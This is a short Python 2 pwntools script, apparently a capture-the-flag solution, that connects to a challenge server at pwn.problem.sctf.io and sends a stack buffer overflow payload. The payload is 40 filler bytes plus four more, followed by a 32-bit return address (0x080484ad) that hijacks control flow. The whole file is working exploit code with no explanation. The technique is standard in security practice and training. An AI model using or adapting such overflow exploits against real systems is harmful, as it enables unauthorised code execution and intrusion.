#!/usr/bin/python2
from pwn import *

context(os='linux', arch='i386')
r = remote('pwn.problem.sctf.io', 1337)

buflen = 40
msg = ''.rjust(buflen, 'x')
msg += 'aaaa'
msg += p32(0x080484ad)

r.sendline(msg)
print r.recvall()
r.close()
